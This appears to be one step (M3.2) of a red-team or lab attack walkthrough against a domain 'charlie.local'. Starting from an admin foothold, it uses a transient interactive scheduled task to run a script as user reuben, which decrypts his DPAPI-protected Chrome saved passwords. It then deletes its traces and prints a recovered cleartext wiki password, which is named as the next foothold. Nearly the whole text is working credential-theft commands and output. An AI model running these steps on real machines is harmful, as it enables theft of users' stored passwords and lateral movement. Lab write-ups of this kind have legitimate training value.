# M3.2 — how it was validated live

The DPAPI decrypt must run **as reuben** (his profile key only unwraps in his session).
From a SYSTEM/admin foothold on AREUBEN-WS (obtained in M3.1), stage `decrypt_chrome.py`
somewhere world-readable and run it in reuben's context. reuben auto-logs-on, so an
Interactive-principal scheduled task fires in his live session:

```powershell
# stage the decrypter where reuben can read it
Copy-Item decrypt_chrome.py C:\Users\Public\dc.py
# run it as reuben via a transient interactive scheduled task
$a = New-ScheduledTaskAction -Execute 'cmd.exe' `
  -Argument '/c C:\Python314\python.exe C:\Users\Public\dc.py > C:\Users\Public\loot.txt 2>&1'
$p = New-ScheduledTaskPrincipal -UserId 'charlie\reuben' -LogonType Interactive -RunLevel Limited
Register-ScheduledTask -TaskName 'opdec' -Action $a -Principal $p -Force
Start-ScheduledTask -TaskName 'opdec'
Start-Sleep 5
Get-Content C:\Users\Public\loot.txt      # -> the recovered credential
Unregister-ScheduledTask -TaskName 'opdec' -Confirm:$false
Remove-Item C:\Users\Public\dc.py,C:\Users\Public\loot.txt -Force
```

**Validated result:**
```
whoami: reuben
URL=http://wiki.charlie.local/login  USER=reuben@charlie.local  PASS=Reuben.Wiki.2025!
```
No LSASS touched; recovered purely from reuben's DPAPI-protected Chrome profile.
This wiki credential is the M4.1 foothold (edit the runbook page as reuben).
